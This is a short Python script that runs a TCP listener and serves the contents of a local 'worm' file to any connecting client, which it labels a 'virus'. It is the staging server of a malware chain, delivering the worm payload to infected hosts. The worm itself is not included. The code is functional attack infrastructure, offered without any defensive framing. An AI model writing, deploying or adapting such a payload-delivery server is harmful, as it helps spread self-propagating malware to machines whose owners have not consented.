#!/usr/bin/env python3
import socket
import sys

# Host and port information
HOST = '0.0.0.0'
PORT = int(sys.argv[1])

# Obtain worm content
with open('worm', 'r') as f:
    worm_content = f.read()

# Set socket information
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)

    print(f'[*] Server Listening at: {HOST}:{PORT}')
    
    # TCP connection
    while True:
        conn, addr = s.accept()
        with conn:
            print(f'[*] Connected by {addr[0]}:{addr[1]}')
            try:
                indata = conn.recv(1024)
                print('[*] Virus message:', indata.decode())

                outdata = worm_content
                conn.send(outdata.encode())
                print('[+] The worm has been sent to the virus')
            except socket.error:
                print('[!] Client disconnected.')